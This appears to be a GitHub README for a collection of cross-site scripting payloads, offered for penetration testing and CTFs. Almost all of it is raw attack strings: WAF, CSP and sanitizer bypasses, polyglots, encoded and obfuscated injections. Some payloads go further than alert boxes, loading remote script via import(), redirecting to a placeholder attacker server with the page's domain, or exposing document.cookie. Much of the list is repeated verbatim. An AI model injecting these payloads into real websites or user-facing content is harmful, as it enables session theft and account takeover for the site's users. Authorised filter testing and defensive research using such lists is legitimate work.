# XSS-payloads Collection
This repository contains a curated list of **Cross-Site Scripting (XSS) payloads** for educational and penetration testing purposes. These payloads are collected, tested, and categorized for bypassing various filters and web application firewalls (WAFs), including HTML sanitizers, Content Security Policy (CSP), and more.

> ⚠️ **Disclaimer**  
This project is intended **only for ethical hacking**, security research, and educational purposes. **Do not use** these payloads on systems you do not own or have permission to test. Unauthorized access or attacks are illegal and unethical.

---

## 📂 Payload Categories

- ✅ Basic Payloads
- 🧠 HTML Context Payloads
- 📜 Scriptless (No `<script>`) XSS
- 🎯 Bypass Techniques (CSP, WAF, Sanitizers)
- 🌀 SVG, MathML, XML-based XSS
- 🧪 Obfuscated / Polyglot Payloads
- 🧬 JavaScript URI-based Payloads
- 🪝 Event Handler Injections (onerror, onclick, etc.)
- 🧷 InnerHTML/DOM-based XSS
- 🔀 UTF-7 / Encoded Payloads
- 💣 Edge-case XSS (quirks, exotic payloads)

---

## 📁 How to Use

1. Clone this repository:
   ```bash
   git clone https://github.com/adham-hashem/XSS-payloads.git

2. Use the payloads in your penetration testing lab, CTFs, or while analyzing web app vulnerabilities.

---

## Payloads

jaVasCript:/*-/*/`/'/"/**/(/ */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`

javascript:/*--></title></style></textarea></script><svg/onload=alert(document.domain)>

<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'

<img src="data:image/svg+xml,%3Csvg%20onload=alert(1)%3E">

<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">

<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">

<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">

<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">

<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">

<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>

<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

<DIV STYLE="background-image: url(javascript:alert('XSS'))">

<DIV STYLE="width: expression(alert('XSS'));">

<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>

<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>

<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>

(alert)(1)

al\u0065rt(1)

<svg onload="javascript:alert(1)"></svg>

<bgsound onPropertyChange="javascript:alert(1)">

<applet onError="javascript:alert(1)">

<marquee onStart="javascript:alert(1)">

<frameset onFocus="javascript:alert(1)">

<xml onPropertyChange="javascript:alert(1)">

<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>

<math href="javascript:alert(1)">CLICKME</math>

<event-source src="%(event)s" onload="javascript:alert(1)">

<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi

jaVasCript:/*-/*/`/'/"/**/(/ */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`

javascript:/*--></title></style></textarea></script><svg/onload=alert(document.domain)>

<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'

<img src="data:image/svg+xml,%3Csvg%20onload=alert(1)%3E">

<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">

<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">

<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">

<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">

<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">

<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>

<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

<DIV STYLE="background-image: url(javascript:alert('XSS'))">

<DIV STYLE="width: expression(alert('XSS'));">

<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>

<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>

<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>

<svg onload="javascript:alert(1)"></svg>

<bgsound onPropertyChange="javascript:alert(1)">

<applet onError="javascript:alert(1)">

<marquee onStart="javascript:alert(1)">

<frameset onFocus="javascript:alert(1)">

<xml onPropertyChange="javascript:alert(1)">

<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>

<math href="javascript:alert(1)">CLICKME</math>

<event-source src="%(event)s" onload="javascript:alert(1)">

<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi

<a"/onclick=(confirm)()>Click Here!

Dec: <svg onload=prompt%26%230000000040document.domain)>

Hex: <svg onload=prompt%26%23x000000028;document.domain)>

xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>

<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>

<--%253cimg%20onerror=alert(1)%20src=a%253e --!>

<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>

javascript:{ alert`0` }

1'"><img/src/onerror=.1|alert``>

<img src=x onError=import('//1152848220/')>

%2sscript%2ualert()%2s/script%2u

<svg on onload=(alert)(document.domain)>

<img ignored=() src=x onerror=prompt(1)>

<svg onx=() onload=(confirm)(1)>

“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

<svg on =i onload=alert(domain) (working)

<svg/onload=location/**/='https://your.server/'+document.domain>

<svg onx=() onload=window.alert?.()> (working)

test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic

"onx+%00+onpointerenter%3dalert(domain)+x" (working)- @Brutelogic

"><svg%20onload=alert%26%230000000040"1")> (working)- @IamRenganathan

%27%09);%0d%0a%09%09[1].find(alert)//

"><img src=1 onmouseleave=print()> - @itsgeekymonk

<svg on onload=(alert)(document.domain)> -@zapstiko

<svg/on%20onload=alert(1)> (working) -@aufzayed

<img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_mi

<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>

<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>

<svg><circle><set onbegin=prompt(1) attributename=fill>

<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>

"%3balert`1`%3b"

asd"`> onpointerenter=x=prompt,x`XSS`

<x onauxclick=import('//1152848220/')>click

<x onauxclick=a=alert,a(domain)>click -@niksthehacker

<x onauxclick=import('//1152848220/')>click

<x onauxclick=import('//xss/')>click

\"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss

{{constructor.constructor(alert`1`)()}}

javascript:new%20Function`al\ert\`1\``;

">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>

">'><details/open/ontoggle=confirm('XSS')>

6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/

&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;

<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme   (working)-Pinaki @0xInfection(Make sure to URL encode the payload properly)

tarun"><x/onafterscriptexecute=confirm%26lpar;)// -@sratarun

<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click (workin)Pinaki @0xInfection (Make sure the applications decodes the payload from encoded)

<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"> - @xsspayloads

<svg onload\r\n=$.globalEval("al"+"ert()");>

<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click Pinaki @0xInfection

<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div"> -@AldenAous

<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />tap

ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6 -@naglinagli

<meter onmouseover="alert(1)" -@manjith27945363

'">><div><meter onmouseover="alert(1)"</div>" -@manjith27945363

>><marquee loop=1 width=0 onfinish=alert(1)> -@manjith27945363

Wordfence 7.4.2

<a href=&#01javascript:alert(1)> -@brutelogic

<a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>

<iframe srcdoc="<script>prompt(document.domain)</script>"></iframe>

<video><source onerror="prompt(1)"></video>

<math><mtext></title><script>alert(1)</script>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>

<details open ontoggle=prompt(1)>

<input autofocus onfocus=alert(1)>

<isindex type=image src=1 onerror=alert(1)>

<object data="data:text/html,<script>alert(1)</script>"></object>

<svg><a xlink:href="javascript:alert(1)">X</a></svg>

<svg xmlns="http://www.w3.org/2000/svg"><script href="data:text/javascript,alert(1)"></script></svg>

<form><button formaction="javascript:alert(1)">Click</button></form>

<iframe src="javascript:alert`XSS`"></iframe>

<math href="data:x,alert(1)" xmlns="http://www.w3.org/1998/Math/MathML">CLICK</math>

<iframe srcdoc="</script><script>alert(1)</script>"></iframe>

<svg><g onload=alert(1)></g></svg>

<input oncut="alert(1)" oncopy="alert(1)" onpaste="alert(1)">

<keygen autofocus onfocus=alert(1)>

<input onblur=alert(1) autofocus>

<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br></body>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYlE/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

javascript:/*--></title></style></textarea></script></xmp>

<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>

JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--

></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->

---

## 📦 Contributing

Want to help? Submit your tested payloads via pull requests. Please include:
A comment on what it bypasses (e.g., CSP bypass, tag-based filtering).
Only include tested payloads.
No duplicates or broken ones, please.

---

## 🔒 License

This repository is licensed under the MIT License.
